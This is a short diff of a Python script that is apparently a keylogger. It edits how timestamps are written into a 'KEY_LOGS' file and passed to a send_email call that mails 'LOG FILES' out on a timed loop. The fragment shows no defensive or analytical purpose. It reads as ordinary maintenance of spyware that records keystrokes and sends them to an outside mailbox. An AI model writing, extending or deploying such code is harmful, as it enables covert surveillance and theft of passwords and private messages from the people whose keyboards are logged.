@@ -255,9 +255,8 @@ def on_release(key):
     if currentTime > stoppingTime:
         return False
 
-timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 with open(file_path + extend + keys_information, "a") as f:
-    f.write("KEY_LOGS\n----------"+timestamp+"----------\n")
+    f.write("KEY_LOGS\n----------"+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+"----------\n")
     f.close()
 
 count = 0
@@ -286,7 +285,7 @@ while currentTime < stoppingTime:
         future4.result()  # Wait for the fourth function to complete
 
         # Execute the fifth function
-        future5 = executor.submit(send_email, send_file_names, timestamp, "LOG FILES")
+        future5 = executor.submit(send_email, send_file_names, time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "LOG FILES")
         future5.result()  # Wait for the fifth function to complete    
     
     currentTime = time.time()
